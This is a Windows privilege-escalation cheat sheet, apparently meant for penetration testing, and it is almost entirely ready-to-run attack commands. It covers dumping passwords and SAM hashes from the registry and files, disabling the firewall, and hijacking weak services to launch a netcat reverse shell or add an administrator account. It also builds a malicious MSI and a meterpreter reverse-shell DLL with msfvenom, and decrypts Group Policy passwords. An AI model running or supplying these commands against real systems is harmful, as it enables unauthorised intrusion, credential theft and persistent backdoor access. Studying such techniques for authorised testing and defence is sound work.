# Windows Privilege Escalation

Basic Information

    systeminfo
    set
    hostname
    net users
    net user user1
    net localgroups

	# Set path:
    set PATH=%PATH%;C:\xampp

Firewall

   	netsh firewall show state
    netsh firewall show config

	# Turn firewall off

    netsh firewall set opmode disable
	
	# allow RDP
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f


Cleartext passwords

    Windows autologin:
    reg query "HKLM\SOFTWARE\Microsoft\WindowsNT\Currentversion\Winlogon"
    
    VNC:
    reg query "HKCU\Software\ORL\WinVNC3\Password"

    SNMP Parameters:
    reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

    Putty:
    reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
    	
    Search for password in registry:
    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s

Find files

   	dir /s /b /a | findstr filename
   	dir /s *pass* == *cred* == *vnc* == *config*
   	findstr /si password *.xml *.ini *.txt *.config
   	findstr /si pass *.xml *.ini *.txt *.config
    
Check these files

   	c:\sysprep.inf
    c:\sysprep\sysprep.xml
    c:\unattend.xml
    %WINDIR%\Panther\Unattend\Unattended.xml
    %WINDIR%\Panther\Unattended.xml
   	web.config

    System and SAM:
   	windows\repair\SAM
    %SYSTEMROOT%\repair\SAM
    %SYSTEMROOT%\System32\config\RegBack\SAM
    %SYSTEMROOT%\System32\config\SAM
   	%SYSTEMROOT%\repair\system
    %SYSTEMROOT%\System32\config\SYSTEM
    %SYSTEMROOT%\System32\config\RegBack\system
	
	Kali command to get hashes:
	samdump2 -o hashes.txt system.old sam.old

	Windows\NTDS\ntds.dit
	
Weak File Permissions
		
	accesschk.exe -qwsu "Everyone" *
	accesschk.exe -qwsu "Authenticated Users" *
	accesschk.exe -qwsu "Users" *

Reconfigure service parameters

	Unquoted service paths
	wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
    
Weak service permissions

	upload accesscheck from Sysinternals to find weak permissions
	accesschk.exe -uwcqv "currentuser" *
	accesschk.exe -uwcqv "Everyone" *
	accesschk.exe -uwcqv "Authenticated Users" *
	accesschk.exe -uwcqv "Users" *
	
	sq qc "vulnerableservicename"
		
	Note the space after the equals sign and before the quotes when using sc config below
	
	To reconfigure to send netcat reverse shell:
	sc config SERVICENAME binpath= "C:\pathtonetcat\nc.exe -nvIPADDRESS PORT -e "C:\Windows\System32\cmd.exe"
	sc config SERVICENAME obj= ".\LocalSystem" password= ""
		
	To reconfigure to add privileged user:
	sc config SERVICENAME binpath= "net user hackerman password /add"
	sc stop SERVICENAME
	sc start SERVICENAME
	sc config SERVICENAME binpath= "net localgroup Administrators hackerman /add"
	sc start SERVICENAME
	
Inside Service
	
	netstat /a
    netstat -ano
	
Insecure File/Folder Permissions

	XP and older:
	cacls filename
	
	Vista and newer:
	icacls "C:\Program Files (x86)\ProgramFolder\Subfolder"
	
	Powershell:
	Get-Acl | fl
	Get-ChildItem | Get-Acl
	
	
Check for AlwaysInstallElevated 
	
	reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	
	# If you get a return code then any package will install with admin privileges, install a malicious msi to do whatever you like

	msfvenom -f msi-nouac -p windows/adduser USER=hackerman PASS=password -o add_user.msi
	
Installed software
	
	tasklist /svc
    net start
    reg query HKEY_LOCAL_MACHINE\SOFTWARE
    DRIVERQUERY

	Look in:
    C:\Program files
    C:\Program files (x86)
    Home directory of the user

	Find version of OS via files such as explorer.exe and use pev on Kali
	pev -p explorer.exe

Scheduled tasks

	schtasks /query /fo LIST /v
	
	C:\windows\tasks
	
	Windows Scheduled Task Log:
    c:\WINDOWS\SchedLgU.Txt

DLL Hijacking
	
	Examine processes, identify any which may be running as a higher privileged user
    
	Download exe and examine to find any references of DLL loading with procmon from sysinternals

	Set filters to the processname, result is NAME NOT FOUND, and Path ends with .dll
	
    Check file permissions with icacls to see if any locations listed are able to be written to by current user
	
    Create dll payload:
	msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.2.60 lport=8989 -f dll > hijackable.dll

Add user and enable RDP

	net user hackerman hack123 /add
    net localgroup Administrators hackerman /add
    net localgroup "Remote Desktop Users" hackerman /ADD
	
	Enable RDP:
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

    If you get this error:
	"ERROR: CredSSP: Initialize failed, do you have correct kerberos tgt initialized?
    Failed to connect, CredSSP required by server.""
	Add this reg key:
	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

	
Group Policy Preferences

	Output environment-variables:
    set
    
    Look for the following:
    LOGONSERVER=\\NAMEOFSERVER
    USERDNSDOMAIN=DOMAIN.LOCAL

    Look up ip-address:
    nslookup nameofserver.domain.local
    
    Mount SYSVOL
    net use z: \\IPADDRESS\SYSVOL

    Enter the mapped drive:
    z:

    Search for groups.xml file:
    dir Groups.xml /s
	
	Decrypt any passwords in Kali:
	gpp-decrypt encryptedpassword
